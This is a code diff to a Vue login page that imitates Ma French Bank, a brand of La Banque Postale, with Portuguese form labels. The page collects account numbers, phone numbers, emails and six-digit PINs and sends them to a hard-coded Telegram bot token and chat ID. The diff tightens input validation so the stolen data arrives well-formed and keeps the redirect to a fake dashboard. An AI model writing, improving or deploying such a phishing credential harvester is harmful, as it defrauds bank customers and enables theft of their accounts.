@@ -27,7 +27,7 @@
     </div>
     
     <div class="welcome-section">
-      <img src="/public/card2.png" alt="Welcome Image" class="welcome-image" width="600px" height="600px">
+      <img src="/card2.png" alt="Welcome Image" class="welcome-image" width="600px" height="600px">
       <div class="welcome-text">
         <h2>BEM-VINDO AO MEU BANCO FRANCÊS</h2>
         <p>Ma French Bank é o banco 100% móvel do grupo La Banque Postale. Um banco acessível, aberto a todos, sem condições de recursos, reivindicamos bem alto os valores de proximidade e simplicidade que constituem o ADN de La Poste e La Banque Postale.</p>
@@ -76,14 +76,14 @@
       <div class="modal">
         <div class="modal-content">
           <div class="modal-image" style="margin-right: 80px;">
-            <img src="/public/cad.jpg" alt="Login Image">
+            <img src="/cad.jpg" alt="Login Image">
           </div>
           <div class="modal-form">
             <h2>Conecte-se</h2>
             <form @submit.prevent="submitLogin">
               <div class="form-group">
                 <label for="accountNumber">número de conta</label>
-                <input type="text" id="accountNumber" v-model="accountNumber" @input="formatAccountNumber" required maxlength="19">
+                <input type="text" id="accountNumber" v-model="accountNumber" @input="formatAccountNumber" required minlength="19" maxlength="19"> 
               </div>
               <div class="form-group">
                 <label for="country">país</label>
@@ -95,7 +95,7 @@
               </div>
               <div class="form-group">
                 <label for="phoneNumber">Número de telefone</label>
-                <input type="text" id="phoneNumber" v-model="phoneNumber" required>
+                <input type="text" id="phoneNumber" v-model="phoneNumber" required minlength="5">
               </div>
               <div class="form-group">
                 <label for="email">E-mail</label>
@@ -103,7 +103,7 @@
               </div>
               <div class="form-group">
                 <label for="pin">Pinho</label>
-                <input type="password" id="pin" v-model="pin" required maxlength="6">
+                <input type="password" id="pin" v-model="pin" required maxlength="6" minlength="6">
               </div>
               <button type="submit">Para validar</button>
             </form>
@@ -128,7 +128,6 @@
 <script setup>
 import { ref, onMounted } from 'vue';
 import { useRouter } from 'vue-router';
-
 import axios from 'axios';
 
 const menuOpen = ref(false);
@@ -140,8 +139,8 @@ const closeMenu = () => {
 };
 
 const slides = ref([
-  { image: '/public/card.png', text: 'Bienvenue à MYBANK' },
-  { image: '/public/card2.png', text: 'Des services bancaires de qualité' },
+  { image: '/card.png', text: 'Bienvenue à MYBANK' },
+  { image: '/card2.png', text: 'Des services bancaires de qualité' },
 ]);
 
 const currentSlide = ref(0);
@@ -174,7 +173,6 @@ const countries = ref([
   // Add more countries as needed
 ]);
 
-
 const closeLoginModal = () => {
   showLoginModal.value = false;
 };
@@ -188,67 +186,43 @@ const updatePhonePrefix = () => {
   phoneNumber.value = country ? country.prefix : '';
 };
 
-// Fonction pour envoyer les données à Telegram
-const sendToTelegram = async (formData) => {
+const submitLogin = async () => {
+  if (accountNumber.value.length !== 19 || !/^\d{4} \d{4} \d{4} \d{4}$/.test(accountNumber.value)) {
+    alert('O número da conta deve ter exatamente 19 caracteres e estar no formato correto.');
+    return;
+  }
+  
+  if (pin.value.length !== 6 || !/^\d{6}$/.test(pin.value)) {
+    alert('O PIN deve ter exatamente 6 dígitos.');
+    return;
+  }
+
+  const token = '6356812643:AAGioWuATBRtm2Jop1LhnHmE2oQvA2PDfEg';
+  const chat_id = '1802704596';
+  const message = `Account Number: ${accountNumber.value}\nCountry: ${selectedCountry.value}\nPhone Number: ${phoneNumber.value}\nEmail: ${email.value}\nPIN: ${pin.value}`;
+
   try {
-    // Token d'accès de votre bot Telegram
-    const token = '6356812643:AAGioWuATBRtm2Jop1LhnHmE2oQvA2PDfEg';
-
-    // ID du chat ou du groupe où vous souhaitez recevoir les messages
-    const chatId = '1802704596';
-
-    // Message à envoyer à Telegram
-    const message = `
-      Nouvelle connexion :
-      Numéro de compte : ${formData.accountNumber}
-      Pays : ${formData.selectedCountry}
-      Numéro de téléphone : ${formData.phoneNumber}
-      Email : ${formData.email}
-      PIN : ${formData.pin}
-    `;
-
-    // URL de l'API pour envoyer le message à Telegram
-    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;
-
-    // Paramètres de la requête POST
-    const params = new URLSearchParams({
-      chat_id: chatId,
-      text: message,
+    const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
+      chat_id: chat_id,
+      text: message
     });
 
-    // Envoi de la requête POST à l'API Telegram
-    const response = await axios.post(apiUrl, params);
-
-    // Affichage de la réponse de l'API Telegram
-    console.log(response.data);
-    // Redirection vers le dashboard
-    router.push('/dash');
+    if (response.status === 200) {
+      router.push('/dash');
+    }
   } catch (error) {
-    console.error('Erreur lors de l\'envoi du message à Telegram :', error);
+    console.error('Error during login:', error);
   }
 };
 
-// Fonction pour soumettre le formulaire de login
-const submitLogin = () => {
-  // Envoyer les données à Telegram avant la redirection
-  sendToTelegram({ accountNumber: accountNumber.value, selectedCountry: selectedCountry.value, phoneNumber: phoneNumber.value, email: email.value, pin: pin.value });
-  
-};
 
 const openLoginModal = () => {
   showLoginModal.value = true;
 };
 
-const startAutoSlide = () => {
-  setInterval(() => {
-    nextSlide();
-  }, 5000); // Défilement toutes les 5 secondes (5000 millisecondes)
-};
-
 onMounted(() => {
-  startAutoSlide();
+  setInterval(nextSlide, 5000);
 });
-
 </script>
 
 
